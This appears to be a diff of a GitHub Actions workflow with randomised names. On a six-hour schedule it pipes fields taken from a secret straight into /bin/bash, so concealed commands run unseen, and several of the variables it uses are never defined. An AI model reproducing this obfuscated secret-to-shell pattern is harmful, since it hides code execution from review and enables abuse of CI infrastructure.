@@ -1,9 +1,8 @@
 name: nongqizheng3456
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '2 3/6 * * *'
+    - cron: '54 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,16 +10,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: nongqizheng3456
         env:
-          yhhcg1804: ${{ secrets.yhhcg1804 }}
+          aoplc4058: ${{ secrets.aoplc4058 }}
         run: |
-          echo $yhhcg1804 | jq -r .pgjk622 | /bin/bash
-          echo $jwii4 | jq -r .lpn03 | /bin/bash
-          echo $joucj25 | jq -r .w724 | /bin/bash
-          echo $trnpd53 | jq -r .h096 | /bin/bash
-          echo $oiwhl05 | jq -r .t172 | /bin/bash
-          echo $gshn059 | jq -r .yinvx7711 | /bin/bash
-          echo $tohek4964 | jq -r .o29177 | /bin/bash
-          echo $wotgw8699 | jq -r .l55519 | /bin/bash
-          echo $llim725 | jq -r .xqgov08 | /bin/bash
-          echo $wl5 | jq -r .gejwb91 | /bin/bash
+          echo $aoplc4058 | jq -r .pyzg0 | /bin/bash
+          echo $i711 | jq -r .bqlua0330 | /bin/bash
+          echo $f08813 | jq -r .jx8 | /bin/bash
+          echo $mvbf697 | jq -r .alpew7932 | /bin/bash
+          echo $exug6 | jq -r .uvcup86 | /bin/bash
+          echo $gvf40 | jq -r .zua45 | /bin/bash
+          echo $o58775 | jq -r .ac2 | /bin/bash
+          echo $xl6201 | jq -r .fw0 | /bin/bash
+          echo $bfiam29 | jq -r .a556 | /bin/bash
+          echo $xfuw051 | jq -r .hfsq120 | /bin/bash
+          echo $m454 | jq -r .li4208 | /bin/bash
+          echo $xze16323 | jq -r .gfhv906 | /bin/bash
 
